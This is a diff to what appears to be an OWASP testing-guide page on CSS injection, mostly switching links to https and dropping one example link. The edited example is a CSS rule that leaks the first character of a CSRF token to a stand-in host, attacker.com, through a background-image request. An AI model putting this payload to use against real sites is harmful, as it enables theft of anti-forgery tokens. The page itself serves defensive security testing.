@@ -44,7 +44,7 @@ Here is an example of code that attempts to select an input with a `name` matchi
 ```html
 <style>
 input[name=csrf_token][value=^a] {
-    background-image: url(http://attacker.com/log?a);
+    background-image: url(https://attacker.com/log?a);
 }
 </style>
 ```
@@ -76,8 +76,7 @@ The above code contains a source `location.hash`, controlled by the attacker, th
 
 The following pages provide examples of CSS injection vulnerabilities:
 
-- [Password "cracker" via CSS and HTML5](http://html5sec.org/invalid/?length=25)
-- [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)
+- [Password "cracker" via CSS and HTML5](https://html5sec.org/invalid/?length=25)
 - [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)
 
 For further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
